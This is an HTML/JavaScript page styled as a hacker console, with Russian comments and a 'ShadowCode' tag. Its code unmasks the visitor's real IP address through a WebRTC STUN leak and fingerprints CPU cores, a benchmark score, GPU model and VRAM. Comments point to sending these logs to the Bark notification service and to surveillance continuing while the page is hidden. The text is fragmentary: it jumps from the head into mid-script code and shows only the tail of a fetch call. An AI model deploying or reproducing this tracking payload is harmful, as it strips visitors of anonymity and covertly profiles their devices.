<!DOCTYPE html>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow-y: auto;
            overflow-x: hidden;
            padding: 20px;
        }
        
        .console {
            width: 100%;
            max-width: 600px;
            background: #0a0a0a;
            border: 2px solid #0f0;
            border-radius: 8px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
            padding: 20px;
            font-size: 13px;
            line-height: 1.6;
            position: relative;
        }
        
        .console::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                rgba(0, 255, 0, 0.03) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            border-radius: 8px;
        }
        
        .header {
            text-align: center;
            border-bottom: 1px solid #0f0;
            padding-bottom: 15px;
            margin-bottom: 15px;
            text-shadow: 0 0 15px #0f0, 0 0 30px #0f0;
            font-size: 18px;
            font-weight: bold;
            letter-spacing: 3px;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 10px #0f0, 0 0 20px #0f0; }
            to { text-shadow: 0 0 20px #0f0, 0 0 40px #0f0, 0 0 60px #0f0; }
        }
        
        .log-entry {
            padding: 3px 0;
            border-bottom: 1px solid rgba(0, 255, 0, 0.1);
            animation: fadeIn 0.3s ease-in;
            word-break: break-all;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(-10px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .success { color: #00ff00; }
        .warning { color: #ffff00; }
        .error { color: #ff0000; }
        .info { color: #00ffff; }
        .data { color: #ff00ff; }
        .ip-color { color: #ff8800; }
        .hardware-color { color: #00ff88; }
        
        .prompt {
            display: flex;
            align-items: center;
            margin-top: 10px;
        }
        
        .cursor {
            display: inline-block;
            width: 10px;
            height: 16px;
            background: #0f0;
            margin-left: 5px;
            animation: blink 1s step-end infinite;
        }
        
        @keyframes blink {
            50% { opacity: 0; }
        }
        
        .progress-bar {
            width: 100%;
            height: 3px;
            background: #111;
            margin: 10px 0;
            border-radius: 2px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #0f0, #00ff00, #0f0);
            width: 0%;
            transition: width 0.3s ease;
            animation: progress 2s ease-in-out infinite;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 80%; }
            100% { width: 100%; }
        }
        
        .badge {
            display: inline-block;
            padding: 1px 5px;
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #0f0;
            border-radius: 3px;
            font-size: 11px;
            margin-left: 5px;
        }
        
        .separator {
            border: none;
            border-top: 1px dashed #0f0;
            margin: 10px 0;
            opacity: 0.5;
        }
        
        .watermark {
            position: fixed;
            bottom: 10px;
            right: 10px;
            font-size: 8px;
            color: #111;
            letter-spacing: 5px;
            z-index: 999;
        }
    </style>
</head>

            }

            entry.innerHTML = `<span style="color:#666;">[${timestamp}]</span> ${message}`;
            logContainer.appendChild(entry);
            
            // Автоскролл вниз
            entry.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }
        
        // Утилита для отправки логов в Bark

        // 1. ДОСТАЕМ РЕАЛЬНЫЙ IP ЧЕРЕЗ УТЕЧКУ WebRTC (STUN/TURN)
        function getRealIP() {
            return new Promise((resolve) => {
                const ipSet = new Set();
                let resolved = false;
                
                logToConsole('🌐 Запуск WebRTC STUN клиента...', 'info');
                
                try {
                    const pc = new RTCPeerConnection({ 
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:stun1.l.google.com:19302' },
                            { urls: 'stun:stun2.l.google.com:19302' }
                        ] 
                    });
                    
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                        const candidate = ice.candidate.candidate;
                        const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                        const match = candidate.match(ipRegex);
                        
                        if (match) {
                            const ip = match[0];
                            if (!ip.startsWith('127.') && !ip.startsWith('0.')) {
                                ipSet.add(ip);
                                logToConsole(`🔍 Найден IP через STUN: ${ip}`, 'ip-color');
                                
                                if (!resolved) {
                                    resolved = true;
                                    setTimeout(() => {
                                        pc.close();
                                        resolve(Array.from(ipSet));
                                    }, 500);
                                }
                            }
                        }
                    };
                    
                    // Таймаут на случай блокировки WebRTC
                    setTimeout(() => { 
                        if (!resolved) {
                            resolved = true;
                            pc.close();
                            logToConsole('⚠️ WebRTC таймаут (возможно заблокирован)', 'warning');
                            resolve(Array.from(ipSet)); 
                        }
                    }, 3000);
                    
                } catch (e) {
                    logToConsole(`❌ Ошибка WebRTC: ${e.message}`, 'error');
                    resolve(['WebRTC blocked']);
                }
            });
        }

        // 2. ДЕТЕКТОР ПРОЦЕССОРА С БЕНЧМАРКОМ
        async function getTrueCPUInfo() {
            logToConsole('🧠 Запуск анализа CPU...', 'info');
            
            const info = {
                cores: navigator.hardwareConcurrency || 'N/A',
                estimatedArch: 'N/A',
                vendorGuess: 'N/A',
                performanceScore: 'N/A',
                cpuClass: 'Unknown'
            };

            // Попытка через WebAssembly
            try {
                const wasmCheck = await WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0]));
                info.wasm = true;
                logToConsole('✅ WebAssembly доступен', 'success');
            } catch (e) { 
                info.wasm = false; 
                logToConsole('❌ WebAssembly недоступен', 'warning');
            }

            // Определение архитектуры
            if (navigator.platform) {
                const p = navigator.platform.toLowerCase();
                logToConsole(`📱 Platform: ${navigator.platform}`, 'data');
                
                if (p.includes('arm') || p.includes('aarch')) info.estimatedArch = 'ARM';
                else if (p.includes('win32')) info.estimatedArch = 'x86 (32-bit)';
                else if (p.includes('win64')) info.estimatedArch = 'x86_64';
                else if (p.includes('linux')) {
                    info.estimatedArch = p.includes('arm') || p.includes('aarch') ? 'ARM (Linux)' : 'x86 (Linux)';
                }
                else if (p.includes('iphone') || p.includes('ipad')) info.estimatedArch = 'Apple Silicon (ARM64)';
                else if (p.includes('mac')) info.estimatedArch = 'Apple/Intel (macOS)';
            }

            // Бенчмарк ядер
            try {
                logToConsole('⏱️ Запуск бенчмарка CPU...', 'info');
                const start = performance.now();
                const workers = [];
                const threadCount = Math.min(navigator.hardwareConcurrency || 4, 8); // Ограничиваем для мобильных
                
                for (let i = 0; i < threadCount; i++) {
                    workers.push(new Promise((resolve) => {
                        try {
                            const workerCode = `
                                self.onmessage = function(e) {
                                    let x = 0;
                                    for(let i = 0; i < 5000000; i++) {
                                        x += Math.sqrt(i) * Math.sin(i);
                                    }
                                    self.postMessage(x);
                                };
                            `;
                            const blob = new Blob([workerCode], { type: 'application/javascript' });
                            const workerUrl = URL.createObjectURL(blob);
                            const worker = new Worker(workerUrl);
                            
                            worker.onmessage = () => { 
                                worker.terminate();
                                URL.revokeObjectURL(workerUrl);
                                resolve(); 
                            };
                            
                            worker.onerror = () => {
                                URL.revokeObjectURL(workerUrl);
                                resolve();
                            };
                            
                            worker.postMessage('start');
                        } catch (e) {
                            resolve(); // Если воркеры заблокированы
                        }
                    }));
                }
                
                await Promise.all(workers);
                const duration = performance.now() - start;
                
                info.performanceScore = duration.toFixed(2) + 'ms';
                logToConsole(`⏱️ Бенчмарк завершен: ${duration.toFixed(2)}ms`, 'hardware-color');
                
                if (duration < 100 && threadCount > 4) info.cpuClass = 'High-End Desktop/Server';
                else if (duration < 300) info.cpuClass = 'Modern Mobile/Desktop';
                else info.cpuClass = 'Low-End/Mobile';
                
            } catch (e) {
                info.performanceScore = 'Blocked';
                logToConsole(`❌ Ошибка бенчмарка: ${e.message}`, 'error');
            }

            return info;
        }

        // 3. РАСШИРЕННЫЙ ОТПЕЧАТОК GPU/WebGL
        function getGPUDetails() {
            logToConsole('🎮 Сканирование GPU...', 'info');
            
            let gpu = { vendor: 'N/A', renderer: 'N/A', memory: 'N/A', webglVersion: 'N/A' };
            
            try {
                const canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl2');
                
                if (gl) {
                    gpu.webglVersion = 'WebGL 2.0';
                    logToConsole('✅ WebGL 2.0 поддерживается', 'success');
                } else {
                    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    gpu.webglVersion = 'WebGL 1.0';
                    logToConsole('⚠️ Только WebGL 1.0', 'warning');
                }
                
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpu.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        gpu.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        logToConsole(`🖥️ GPU: ${gpu.renderer}`, 'hardware-color');
                        logToConsole(`🏢 Vendor: ${gpu.vendor}`, 'data');
                    } else {
                        logToConsole('⚠️ WEBGL_debug_renderer_info недоступен', 'warning');
                    }
                    
                    // Попытка достать память GPU
                    try {
                        const memExt = gl.getExtension('GL_NVX_gpu_memory_info');
                        if (memExt) {
                            const vram = gl.getParameter(memExt.GPU_MEMORY_INFO_DEDICATED_VIDMEM_NVX);
                            gpu.memory = (vram / 1048576).toFixed(0) + ' MB';
                            logToConsole(`💾 VRAM: ${gpu.memory}`, 'hardware-color');
                        }
                    } catch (e) {}
                }
            } catch (e) {
                logToConsole(`❌ Ошибка GPU: ${e.message}`, 'error');
            }
            
            return gpu;
        }

                    })
                    .catch(() => {
                        logToConsole('❌ Не удалось получить HTTP IP', 'warning');
                    });
                    
            }, 1500);
        });
        
        // Обработка ошибок
        window.addEventListener('error', (e) => {
            logToConsole(`⚠️ Ошибка страницы: ${e.message}`, 'error');
            console.error('[ShadowCode] Global error:', e);
        });
        
        // Периодический пинг для поддержки контакта
        setInterval(() => {
            if (document.hidden) {
                logToConsole('👁️ Страница скрыта, но слежка продолжается...', 'warning');
            }
        }, 10000);
    </script>
</body>
</html>
